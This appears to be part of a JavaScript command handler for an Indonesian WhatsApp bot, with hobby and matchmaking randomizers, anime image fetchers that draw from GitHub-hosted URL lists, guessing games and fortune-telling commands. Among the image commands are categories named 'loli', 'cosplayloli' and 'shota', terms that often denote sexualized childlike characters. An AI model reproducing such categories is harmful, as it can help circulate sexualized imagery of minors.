                'Menonton film', 'Travelling', 'Mendaki gunung', 'Fotografi', 'Melukis',
                'Musik', 'Berkebun', 'Menggambar', 'Berburu', 'Mendengarkan podcast',
                'Berbelanja', 'Mengoleksi barang antik', 'Berkendara motor', 'Menyelam',
                'Bermain olahraga tim', 'Memancing', 'Menjahit', 'Mencipta seni', 'Seni bela diri',
                'Coding', 'Yoga', 'Meditasi', 'Menulis puisi', 'Sewaktu-waktu berkumpul dengan teman',
                'Berkreasi dengan DIY', 'Mendengarkan musik klasik', 'Menari', 'Bermain alat musik',
                'Mendengarkan cerita horor', 'Berselancar', 'Bermain skateboard', 'Camping',
                'Main kartu', 'Bermain catur', 'Bermain puzzle', 'Mempelajari bahasa baru',
                'Mengajar', 'Berkumpul di acara komunitas', 'Fotografi alam', 'Menulis cerita fiksi',
                'Berkendara sepeda', 'Main cosplay', 'Kegiatan sosial', 'Melakukan eksperimen kimia',
                'Astrologi', 'Bermain dengan hewan peliharaan', 'Memperbaiki barang rusak', 'Berkunjung ke museum',
                'Bermain tenis', 'Main golf', 'Bermain voli', 'Panjat tebing', 'Mendekorasi rumah',
                'Sewaktu-waktu berkemah', 'Bermain basket', 'Membuat kerajinan tangan', 'Bermain piano',
                'Bermain gitar', 'Mendengarkan musik rock', 'Main drum', 'Mengecat', 'Mengoleksi kartu',
                'Sains eksperimen', 'Menciptakan aplikasi', 'Menjahit pakaian', 'Bermain frisbee',
                'Bermain dengan teknologi', 'Berkendara mobil', 'Berkunjung ke pantai', 'Main catur',
                'Mengunjungi tempat bersejarah', 'Berkebun tanaman hias', 'Menciptakan game', 'Bermain tenis meja',
                'Bermain dengan mainan robotik', 'Bergabung dengan klub diskusi', 'Berkarya di YouTube', 'Menulis blog'
              ]
              const coli = hobi[Math.floor(Math.random() * hobi.length)]
              reply(`*Pertanyaan:* Cekhoby ${pushname}\n*Jawaban:* ${coli}`)
            }
            break

            case 'jodoh':
            case 'cekjodoh': {
              try {
                let target = text ?
                  text.replace(/[@]/g, '').split('@')[0] :
                  m.sender.split('@')[0]

                let member = participants
                  .filter(u => typeof u.jid === 'string' && u.jid.includes('@'))
                  .map(u => u.jid.split('@')[0])

                if (!member.includes(target)) target = m.sender.split('@')[0]

                let jodoh = member[Math.floor(Math.random() * member.length)]
                let jawab = `*JODOHNYA ${sock.getName(target + '@s.whatsapp.net').toUpperCase()}*\n@${target} â¤ï¸ @${jodoh}`
                sock.sendTextWithMentions(m.chat, jawab, m)
              } catch (err) {
                reply('Terjadi kesalahan: ' + err)
              }
            }
            break

// ############# ANIME
    case 'akiyama':
    case 'ana':
    case 'art':
    case 'asuna':
    case 'ayuzawa':
    case 'boruto':
    case 'bts':
    case 'cartoon':
    case 'chiho':
    case 'chitoge':
    case 'cosplay':
    case 'cosplayloli':
    case 'cosplaysagiri':
    case 'cyber':
    case 'deidara':
    case 'doraemon':
    case 'elaina':
    case 'emilia':
    case 'erza':
    case 'exo':
    case 'gamewallpaper':
    case 'gremory':
    case 'hacker':
    case 'hestia':
    case 'hinata':
    case 'husbu':
    case 'inori':
    case 'islamic':
    case 'isuzu':
    case 'itachi':
    case 'itori':
    case 'jennie':
    case 'jiso':
    case 'justina':
    case 'kaga':
    case 'kagura':
    case 'kakasih':
    case 'kaori':
    case 'keneki':
    case 'kotori':
    case 'kurumi':
    case 'lisa':
    case 'madara':
    case 'megumin':
    case 'mikasa':
    case 'mikey':
    case 'miku':
    case 'minato':
    case 'mountain':
    case 'naruto':
    case 'neko2':
    case 'nekonime':
    case 'nezuko':
    case 'onepiece':
    case 'pentol':
    case 'pokemon':
    case 'programming':
    case 'randomnime':
    case 'randomnime2':
    case 'rize':
    case 'rose':
    case 'sagiri':
    case 'sakura':
    case 'sasuke':
    case 'satanic':
    case 'shina':
    case 'shinka':
    case 'shinomiya':
    case 'shizuka':
    case 'shota':
    case 'shortquote':
    case 'space':
    case 'technology':
    case 'tejina':
    case 'toukachan':
    case 'tsunade':
    case 'yotsuba':
    case 'yuki':
    case 'yulibocil':
    case 'yumeko': {

reply("Loading ğŸ”")
      let heyy
      if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json')
      if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json')
      if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json')
      if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json')
      if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json')
      if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boneka.json')
      if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json')
      if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json')
      if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cecan.json')
      if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json')
      if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json')
      if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cogan.json')
      if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json')
      if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json')
      if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json')
      if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json')
      if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json')
      if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json')
      if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/eba.json')
      if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json')
      if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json')
      if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json')
      if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json')
      if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/femdom.json')
      if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/freefire.json')
      if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json')
      if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/glasses.json')
      if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json')
      if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json')
      if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json')
      if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json')
      if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json')
      if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json')
      if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json')
      if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json')
      if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json')
      if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json')
      if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json')
      if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json')
      if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json')
      if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json')
      if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json')
      if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json')
      if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kartun.json')
      if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json')
      if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json')
      if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json')
      if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kpop.json')
      if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kucing.json')
      if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json')
      if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json')
      if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/loli.json')
      if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json')
      if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json')
      if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json')
      if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json')
      if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json')
      if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json')
      if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mobil.json')
      if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/motor.json')
      if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json')
      if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json')
      if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko.json')
      if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json')
      if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json')
      if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json')
      if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json')
      if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json')
      if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json')
      if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/profil.json')
      if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json')
      if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pubg.json')
      if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randblackpink.json')
      if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json')
      if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json')
      if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json')
      if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json')
      if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ryujin.json')
      if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json')
      if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json')
      if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json')
      if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json')
      if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json')
      if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json')
      if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json')
      if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json')
      if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json')
      if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json')
      if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json')
      if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json')
      if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json')
      if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json')
      if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/waifu.json')
      if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallhp.json')
      if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallml.json')
      if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/wallnime.json')
      if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json')
      if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json')
      if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json')
      if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json')
      let yeha = heyy[Math.floor(Math.random() * heyy.length)]
      sock.sendMessage(m.chat, {
        image: {
          url: yeha
        },
        caption: "",
        viewOnce: true,
        contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
  },
      }, {
        quoted: fakeQuoted
      })
    }
    break
    //############ [ GAME ]
case 'tekateki': {
  if (!isGroup) return reply(mess.group)
  if (global.tekateki) return reply('âš ï¸ Masih ada game yang berlangsung!')

  const gamewaktu = 60

  try {
    const { data } = await axios.get('https://api-faa.my.id/faa/tekateki')
    if (!data.status) return reply('Gagal mengambil soal.')

    const soal = data.result.soal
    const jawaban = data.result.jawaban

    // âœ… JAWABAN KE CONSOLE
    console.log('Jawaban : ' + jawaban)

    await reply(
`*GAME TEKA-TEKI*

Soal:
${soal}

Waktu: ${gamewaktu} detik`
    )

    global.tekateki = {
      soal: soal,
      jawaban: jawaban.toLowerCase(),
      waktu: setTimeout(() => {
        if (global.tekateki) {
          reply(
`â° *WAKTU HABIS!*

Soal:
${monospace(soal)}

Jawaban:
${monospace(jawaban)}`
          )
          delete global.tekateki
        }
      }, gamewaktu * 1000),
    }
  } catch (e) {
    console.error(e)
    reply('Terjadi kesalahan.')
  }
}
break
case 'tebaktebakan': {
  if (!isGroup) return reply(mess.group)
  if (global.tebaktebakan) return reply('âš ï¸ Masih ada game yang berlangsung!')

  const gamewaktu = 60

  try {
    const { data } = await axios.get('https://api-faa.my.id/faa/tebaktebakan')
    if (!data.status) return reply('Gagal mengambil soal.')

    const soal = data.result.soal
    const jawaban = data.result.jawaban

    // âœ… JAWABAN KE CONSOLE
    console.log('Jawaban : ' + jawaban)

    await reply(
`*GAME TEBAK-TEBAKAN*

Soal:
${soal}

Waktu: ${gamewaktu} detik`
    )

    global.tebaktebakan = {
      soal: soal,
      jawaban: jawaban.toLowerCase(),
      waktu: setTimeout(() => {
        if (global.tebaktebakan) {
          reply(
`â° *WAKTU HABIS!*

Soal:
${monospace(soal)}

Jawaban:
${monospace(jawaban)}`
          )
          delete global.tebaktebakan
        }
      }, gamewaktu * 1000),
    }
  } catch (e) {
    console.error(e)
    reply('Terjadi kesalahan.')
  }
}
break
case 'tebakkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakkata) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata
}, gamewaktu * 1000)
}
break 
case 'asahotak': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak
}, gamewaktu * 1000)
}
break           
case 'susunkata': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata
}, gamewaktu * 1000)
}
break           
case 'tebakgambar':
if (!isGroup) return reply(mess.group)
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await sock.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: fakeQuoted})
tebakgambar = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar) reply(`Waktu habis!\nJawabannya adalah: ${monospace(jawaban)}`);
delete tebakgambar
}, gamewaktu * 1000)
}
break
case 'tebakbendera': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera
}, gamewaktu * 1000)
}
break
case 'tebakkimia': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkimia = {
soal: soal,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (asahotak) reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkimia
}, gamewaktu * 1000)
}
break        
case 'family100': case 'f100': 
if (!isGroup) return reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./ZionGame/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family = {
soal: soal,
jawaban: famil,
waktu: setTimeout(async function () {
if (global.family) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family.jawaban
for (let i of jwb){teks += `\n${i}`}
reply(teks)
delete family
};
}, gamewaktu * 1000)
}

break   

/*
   PRIMBON
*/

case 'artimimpi': case 'tafsirmimpi': {

if (!text) return reply(`Contoh : ${cmd} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Mimpi :* ${anu.message.mimpi}\nâ€¢ *Arti :* ${anu.message.arti}\nâ€¢ *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama Anda :* ${anu.message.nama_anda.nama}\nâ€¢ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\nâ€¢ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\nâ€¢ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama Anda :* ${anu.message.nama_anda.nama}\nâ€¢ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\nâ€¢ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\nâ€¢ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama Suami :* ${anu.message.suami.nama}\nâ€¢ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\nâ€¢ *Nama Istri :* ${anu.message.istri.nama}\nâ€¢ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\nâ€¢ *Hasil :* ${anu.message.result}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama Anda :* ${anu.message.nama_anda.nama}\nâ€¢ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\nâ€¢ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\nâ€¢ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\nâ€¢ *Sisi Positif :* ${anu.message.sisi_positif}\nâ€¢ *Sisi Negatif :* ${anu.message.sisi_negatif}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {

if (!text) return reply(`Contoh : ${cmd} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Arti :* ${anu.message.arti}\nâ€¢ *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {

if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`â€¢ *Nama :* ${anu.message.nama}\nâ€¢ *Lahir :* ${anu.message.tgl_lahir}\nâ€¢ *Life Path :* ${anu.message.life_path}\nâ€¢ *Destiny :* ${anu.message.destiny}\nâ€¢ *Destiny Desire :* ${anu.message.destiny_desire}\nâ€¢ *Personality :* ${anu.message.personality}\nâ€¢ *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {

if (!text) return reply(`Contoh : ${cmd} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat,  anu.message.gambar, `â€¢ *Nama Anda :* ${anu.message.nama_anda}\nâ€¢ *Nama Pasangan :* ${anu.message.nama_pasangan}\nâ€¢ *Sisi Positif :* ${anu.message.sisi_positif}\nâ€¢ *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {

if (!text) return reply(`Contoh : ${cmd} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
